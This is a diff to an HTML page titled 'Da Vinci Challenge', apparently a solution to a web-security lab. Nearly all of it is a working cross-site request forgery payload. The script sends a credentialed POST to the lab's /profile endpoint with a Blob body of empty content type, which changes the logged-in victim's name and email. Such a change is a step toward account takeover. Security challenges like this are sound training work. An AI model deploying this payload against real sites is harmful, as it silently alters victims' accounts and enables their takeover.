@@ -1,15 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Da Vinci</title>
 </head>
+
 <body>
-    
+
     <h1>Da Vinci Challenge</h1>
 
-        <script>
+    <script>
+
+        const body = new Blob(
+            [JSON.stringify({ name: "hacker", email: "changed@gmail.com" })],
+            { type: "" }
+        );
+
         var xhttp = new XMLHttpRequest();
         xhttp.onreadystatechange = function () {
             if (this.readyState == 4 && this.status == 200) {
@@ -20,8 +28,9 @@
 
         xhttp.open("POST", "https://copddpmw6p.voorivex-lab.online/profile");
         xhttp.withCredentials = true;
-        xhttp.send('{"name":"OsintMan","email":"osintman@voorivex.team"}');
+        xhttp.send(body);
     </script>
 
 </body>
+
 </html>
